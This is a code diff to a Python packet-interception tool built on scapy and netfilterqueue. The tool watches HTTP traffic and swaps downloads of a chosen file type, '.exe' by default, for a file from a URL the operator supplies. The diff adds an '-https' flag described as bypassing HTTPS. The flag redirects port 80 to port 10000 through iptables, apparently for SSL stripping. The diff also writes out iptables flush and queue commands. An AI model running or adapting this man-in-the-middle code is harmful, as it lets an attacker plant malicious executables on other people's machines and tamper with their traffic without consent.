@@ -13,14 +13,15 @@ TARGET = '.exe' #DEFAULT TARGET
 ack_list = []
 URL = 'https://www.google.com'
 LINE = '____________________________________________________________'
+PORT = 0
 
 #Process each packet
 def process_packet(packet):
-    global ack_list, TARGET, URL
+    global ack_list, TARGET, URL, PORT
     IP_pkt = IP(packet.get_payload())
     
     if IP_pkt.haslayer(Raw) and IP_pkt.haslayer(TCP):
-        if IP_pkt[TCP].dport == 80:
+        if IP_pkt[TCP].dport == PORT:
             cprint('Request', 'red', attrs=['bold',], end='')
 
             #Request of download a program
@@ -34,7 +35,7 @@ def process_packet(packet):
                 print('')
 
 
-        elif IP_pkt[TCP].sport == 80:
+        elif IP_pkt[TCP].sport == PORT:
             cprint('Response', 'blue', attrs=['bold',])
 
             #Is it response seq in ack list
@@ -63,6 +64,7 @@ def args_parser():
     parser.add_argument("-interface", "-i", dest="interface", help="Name of the network interface of your machine")
     parser.add_argument("-target", "-t", dest="target", help="Target extension of files")
     parser.add_argument("-url", dest="url", help="URL of files you want to use to replace response")
+    parser.add_argument("-https", dest="https", help="If specified, it bypass HTTPS connection. Otherwise, it works on HTTP connection.", action='store_true')
 
     #Parse command line arguments
     args = parser.parse_args()
@@ -76,21 +78,32 @@ def args_parser():
 
     if args.url:
         URL=args.url
+    
+    return args.local, args.https
 
-    return args.local
 
 
 def main():
-    local = args_parser()
+    global PORT
+    local, https = args_parser()
 
     #Packets are blocked and not forwarded
-    if local:
+    if local or https:
         os.system('iptables -F')
         os.system('iptables -I INPUT -j NFQUEUE --queue-num 0')
         os.system('iptables -I OUTPUT -j NFQUEUE --queue-num 0')
+        
+        if https:
+            os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000')
+    
     else:
         os.system('iptables -F')
         os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')
+
+    if https:
+        PORT = 10000
+    else:
+        PORT = 80
 
 
     #O = queue num
